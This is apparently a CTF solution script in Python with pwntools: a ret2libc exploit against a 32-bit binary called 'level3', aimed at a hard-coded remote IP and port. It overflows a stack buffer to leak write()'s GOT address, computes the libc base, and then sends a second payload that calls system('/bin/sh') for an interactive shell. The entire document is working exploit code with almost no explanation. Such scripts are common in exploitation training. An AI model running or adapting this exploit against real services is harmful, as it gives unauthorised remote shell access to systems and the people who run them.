from pwn import *

context(os="linux", arch="i386", log_level="debug")
content = 1

# elf
elf = ELF("level3")
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']

# libc
lib = ELF('libc_32.so.6')
lib_write_addr = lib.symbols['write']
lib_system_addr = lib.symbols['system']
lib_binsh_addr = next(lib.search(b'/bin/sh'))


def main():
    if content == 0:
        io = process("./level3")
    else:
        io = remote("111.200.241.243", 34633)
    # leak_payload  用flat（）和直接"+"拼接一样
    payload = flat([b'a' * (0x88 + 4), p32(write_plt), p32(main_addr), p32(1), p32(write_got), p32(4)])
    # leak
    io.sendlineafter("Input:\n", payload)
    write_addr = u32(io.recv()[0:4])
    # addr_count
    libcbase = write_addr - lib_write_addr
    system_addr = libcbase + lib_system_addr
    binsh_addr = libcbase + lib_binsh_addr
    # get_shell_payload
    payload = flat([b'a' * (0x88 + 4), p32(system_addr), b'aaaa', p32(binsh_addr)])
    # getshell
    io.sendlineafter("Input:\n", payload)
    io.interactive()


main()
